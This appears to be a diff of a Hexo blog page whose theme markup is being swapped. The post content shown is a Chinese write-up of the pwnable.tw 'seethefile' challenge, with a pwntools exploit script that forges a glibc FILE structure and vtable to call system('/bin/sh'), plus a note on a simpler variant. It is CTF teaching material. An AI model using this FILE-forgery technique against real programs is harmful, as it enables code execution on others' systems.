@@ -1,163 +1,255 @@
-<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【Pwn#0x12】pwnable.tw seethefile writeup | Cameudis's Homepage</title><meta name="author" content="Cameudis"><meta name="copyright" content="Cameudis"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这次借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。 本题相关：FILE伪造、vtable伪造、fclose">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_io/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon_io/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon_io/favicon-16x16.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://google-fonts.mirrors.sjtug.sjtu.edu.cn/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.cameudis.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="这次借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。 本题相关：FILE伪造、vtable伪造、fclose">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【Pwn#0x12】pwnable.tw seethefile writeup">
 <meta property="og:url" content="https://www.cameudis.com/Tech/Pwn/b0d805e48d9f.html">
 <meta property="og:site_name" content="Cameudis&#39;s Homepage">
 <meta property="og:description" content="这次借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。 本题相关：FILE伪造、vtable伪造、fclose">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.imgtg.com/2023/04/11/8z0Vl.png">
 <meta property="article:published_time" content="2023-05-07T04:44:10.000Z">
 <meta property="article:modified_time" content="2024-01-11T08:30:39.609Z">
 <meta property="article:author" content="Cameudis">
 <meta property="article:tag" content="blog">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.imgtg.com/2023/04/11/8z0Vl.png"><link rel="shortcut icon" href="/icon_blackhole.png"><link rel="canonical" href="https://www.cameudis.com/Tech/Pwn/b0d805e48d9f.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-28NXTBGQNR"></script><script>window.dataLayer = window.dataLayer || [];
-function gtag(){dataLayer.push(arguments);}
-gtag('js', new Date());
-gtag('config', 'G-28NXTBGQNR');
-</script><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
-  copy: {
-    success: 'Copy Successful',
-    error: 'Copy Error',
-    noSupport: 'Browser Not Supported'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: 'Just now',
-    min: 'minutes ago',
-    hour: 'hours ago',
-    day: 'days ago',
-    month: 'months ago'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
-    buttonText: 'Load More'
-  },
-  isPhotoFigcaption: true,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: '【Pwn#0x12】pwnable.tw seethefile writeup',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  postUpdate: '2024-01-11 16:30:39'
-}</script><script>(win=>{
-      win.saveToLocal = {
-        set: (key, value, ttl) => {
-          if (ttl === 0) return
-          const now = Date.now()
-          const expiry = now + ttl * 86400000
-          const item = {
-            value,
-            expiry
-          }
-          localStorage.setItem(key, JSON.stringify(item))
-        },
-      
-        get: key => {
-          const itemStr = localStorage.getItem(key)
-      
-          if (!itemStr) {
-            return undefined
-          }
-          const item = JSON.parse(itemStr)
-          const now = Date.now()
-      
-          if (now > item.expiry) {
-            localStorage.removeItem(key)
-            return undefined
-          }
-          return item.value
-        }
-      }
-    
-      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        script.onerror = reject
-        script.onload = script.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          script.onload = script.onreadystatechange = null
-          resolve()
-        }
 
-        Object.keys(attr).forEach(key => {
-          script.setAttribute(key, attr[key])
-        })
+<link rel="canonical" href="https://www.cameudis.com/Tech/Pwn/b0d805e48d9f.html">
 
-        document.head.appendChild(script)
-      })
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>【Pwn#0x12】pwnable.tw seethefile writeup | Cameudis's Homepage</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Cameudis's Homepage</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Exp10re the W0r1d</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-notes">
+
+    <a href="/notes/" rel="section"><i class="fa fa-sticky-note fa-fw"></i>notes</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
     
-      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onerror = reject
-        link.onload = link.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          link.onload = link.onreadystatechange = null
-          resolve()
-        }
-        document.head.appendChild(link)
-      })
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
     
-      win.activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/b0d805e48d9f.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ava1.jpg">
+      <meta itemprop="name" content="Cameudis">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cameudis's Homepage">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【Pwn#0x12】pwnable.tw seethefile writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-05-07 12:44:10" itemprop="dateCreated datePublished" datetime="2023-05-07T12:44:10+08:00">2023-05-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/Tech/Pwn/b0d805e48d9f.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x12】pwnable.tw seethefile writeup" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
     
-        if (t === 'dark') activateDarkMode()
-        else if (t === 'light') activateLightMode()
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/Tech/Pwn/b0d805e48d9f.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/b0d805e48d9f.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
-    
-      const detectApple = () => {
-        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-          document.documentElement.classList.add('apple')
-        }
-      }
-      detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/ava1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://hackmd.io/@cameudis/rJuGtPyh6"><i class="fa-fw fas fa-book"></i><span> PWN</span></a></div><div class="menus_item"><a class="site-page" href="/notes/"><i class="fa-fw fas fa-book"></i><span> Notes</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Cameudis's Homepage"><span class="site-name">Cameudis's Homepage</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://hackmd.io/@cameudis/rJuGtPyh6"><i class="fa-fw fas fa-book"></i><span> PWN</span></a></div><div class="menus_item"><a class="site-page" href="/notes/"><i class="fa-fw fas fa-book"></i><span> Notes</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">【Pwn#0x12】pwnable.tw seethefile writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-05-07T04:44:10.000Z" title="Created 2023-05-07 12:44:10">2023-05-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-01-11T08:30:39.609Z" title="Updated 2024-01-11 16:30:39">2024-01-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Tech/">Tech</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Tech/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/Tech/Pwn/b0d805e48d9f.html" data-flag-title="【Pwn#0x12】pwnable.tw seethefile writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/Tech/Pwn/b0d805e48d9f.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/Tech/Pwn/b0d805e48d9f.html" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div><article class="post-content" id="article-container"><p>这次借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。</p>
+        <p>这次借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。</p>
 <p>本题相关：FILE伪造、vtable伪造、fclose</p>
 <span id="more"></span>
 
@@ -220,32 +312,298 @@ gtag('config', 'G-28NXTBGQNR');
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x0005ae90 : xor eax, eax ; add esp, 0x6c ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc_addr</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;see&quot;</span>, <span class="string">b&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;[heap]\n&quot;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;-&quot;</span>)[:-<span class="number">1</span>].decode(), <span class="number">16</span>) + <span class="number">0x1000</span></span><br><span class="line">    success(<span class="string">&quot;libc_base -&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="comment"># libc_base = int(input(&quot;addr:&quot;), 16)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># create rop chain</span></span><br><span class="line">    payload = <span class="string">b&quot;5&quot;</span> + <span class="string">b&quot;a&quot;</span>*<span class="number">0xb</span></span><br><span class="line">    <span class="comment"># payload += pack(elf.symbols[&quot;puts&quot;]) + pack(0) + pack(0x08048C90) # test</span></span><br><span class="line">    payload += pack(libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]) + pack(<span class="number">0</span>) + pack(<span class="number">0x0804B260</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake file</span></span><br><span class="line">    fileStr = FileStructure()</span><br><span class="line">    fileStr.flags=<span class="number">0xffffdfff</span>    <span class="comment"># no _IO_IS_FILEBUF</span></span><br><span class="line">    fileStr.vtable=<span class="number">0x0804B260</span></span><br><span class="line"></span><br><span class="line">    name = <span class="string">b&#x27;/bin/sh\0&#x27;</span> + pack(libc_base + <span class="number">0x0005ae90</span>)  <span class="comment"># fake vtable</span></span><br><span class="line">    name += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span></span><br><span class="line">    name += pack(<span class="number">0x0804B280</span>+<span class="number">0x10</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc</span>  <span class="comment"># fake FILE pointer</span></span><br><span class="line">    name += <span class="built_in">bytes</span>(fileStr)</span><br><span class="line">    </span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, payload)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;name&quot;</span>, name)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>后记：后来发现其实根本不用ROP，由于调用vtable中的函数时，参数就是自己的file pointer，所以只要在flag字段后面加上”;&#x2F;bin&#x2F;sh;”，然后把 <code>__finish</code> 设置成system地址，就可以直接get shell。见<a target="_blank" rel="noopener" href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/#seethefile">R4bb1t师傅的博客</a></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://www.cameudis.com">Cameudis</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://www.cameudis.com/Tech/Pwn/b0d805e48d9f.html">https://www.cameudis.com/Tech/Pwn/b0d805e48d9f.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="https://i.imgtg.com/2023/04/11/8z0Vl.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/Tech/Network/b81b909d9b2a.html" title="【Network#0x01】RDT协议实现（GBN和SR）"><img class="cover" src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">【Network#0x01】RDT协议实现（GBN和SR）</div></div></a></div><div class="next-post pull-right"><a href="/Tech/Pwn/9b71e71b216d.html" title="【Pwn#0x11】TAMUctf 2023 Pwnme - linked ROP chain"><img class="cover" src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">【Pwn#0x11】TAMUctf 2023 Pwnme - linked ROP chain</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/ava1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Cameudis</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">16</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FILE-%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90"><span class="toc-text">FILE 结构体分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fclose-%E5%88%86%E6%9E%90"><span class="toc-text">fclose 分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93%E4%BC%AA%E9%80%A0"><span class="toc-text">结构体伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP%E8%84%9A%E6%9C%AC"><span class="toc-text">EXP脚本</span></a></li></ol></li></ol></div></div><div class="card-widget card-post-series"><div class="item-headline"><i class="fa-solid fa-layer-group"></i><span>Series</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/861524d904b7.html" title="【Pwn#0x00】pwnable.tw-start/orw/calc writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x00】pwnable.tw-start/orw/calc writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/861524d904b7.html" title="【Pwn#0x00】pwnable.tw-start/orw/calc writeup">【Pwn#0x00】pwnable.tw-start/orw/calc writeup</a><time datetime="2022-08-03T12:10:47.000Z" title="Created 2022-08-03 20:10:47">2022-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/c2f81af52938.html" title="【Pwn#0x01】pwnable.tw 3x17 writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x01】pwnable.tw 3x17 writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/c2f81af52938.html" title="【Pwn#0x01】pwnable.tw 3x17 writeup">【Pwn#0x01】pwnable.tw 3x17 writeup</a><time datetime="2022-08-03T12:17:00.000Z" title="Created 2022-08-03 20:17:00">2022-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/24620b6ce9b9.html" title="【Pwn#0x02】pwnable.tw dubblesort writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x02】pwnable.tw dubblesort writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/24620b6ce9b9.html" title="【Pwn#0x02】pwnable.tw dubblesort writeup">【Pwn#0x02】pwnable.tw dubblesort writeup</a><time datetime="2022-08-05T23:49:02.000Z" title="Created 2022-08-06 07:49:02">2022-08-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/60642d197b03.html" title="【Pwn#0x03】pwnable.tw silver_bullet writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x03】pwnable.tw silver_bullet writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/60642d197b03.html" title="【Pwn#0x03】pwnable.tw silver_bullet writeup">【Pwn#0x03】pwnable.tw silver_bullet writeup</a><time datetime="2022-08-07T01:28:56.000Z" title="Created 2022-08-07 09:28:56">2022-08-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/2fdf0cd9555e.html" title="【Pwn#0x04】BUUCTF get_started_3dsctf_2016"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x04】BUUCTF get_started_3dsctf_2016"></a><div class="content"><a class="title" href="/Tech/Pwn/2fdf0cd9555e.html" title="【Pwn#0x04】BUUCTF get_started_3dsctf_2016">【Pwn#0x04】BUUCTF get_started_3dsctf_2016</a><time datetime="2022-09-20T14:43:58.000Z" title="Created 2022-09-20 22:43:58">2022-09-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/d25cfe689094.html" title="【Pwn#0x05】pwnable.tw hacknote writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x05】pwnable.tw hacknote 